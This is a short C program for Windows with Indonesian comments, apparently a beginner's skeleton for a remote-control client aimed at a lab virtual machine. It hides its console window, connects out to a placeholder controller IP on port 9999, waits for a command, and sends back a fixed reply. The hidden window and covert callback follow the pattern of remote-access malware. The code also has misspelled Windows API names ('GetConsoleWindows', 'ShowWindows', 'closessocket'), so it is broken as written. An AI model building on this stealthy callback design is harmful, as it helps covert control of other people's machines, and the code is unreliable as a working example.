#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

// Membuat pustaka jaringan ws2_32.lib saat komplikasi
#pragma comment(lib, "ws2_32.lib")

int main() {
    // 1. Sembunyikan jendela agar berjalan di latar belakang
    HWND windows = GetConsoleWindows();
    ShowWindows(windows, SW_HIDE);
    
    // 2. Inisialisasi jaringan windows (winsock)
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char buffer[1024] = {0};

    WSAStartup(MAKEWORD(2,2), &wsa);
    s = socket(AF_INET, SOCK_STREAM, 0);

    // 3. Hubungkan ke IP komputer pengendali (ganti dengan alamat IP asli anda)
    server.sin_addr.s_addr = inet_addr("IP_KOMPUTER_PENGENDALI_ANDA");
    server.sin_family = AF_INET;
    server.sin_port = htons(9999);

    if (connect(s, (struct sockaddr *)&server, sizeof(server))<0){
        return 1; // Jika gagal terhubung
    }

    // 4. Menerima perintah dari server Python
    recv(s, buffer, 1023, 0);

    // 5. Logika respon sederhana
    if (strcmp(buffer, "Siapa Kamu") == 0) {
        char respon[] = "Saya adalah Windows 7 Virtual Machine Anda.";
        send(s, respon, strlen(respon), 0);
    }

    closessocket(s);
    WSACleanup();
    return 0;
}
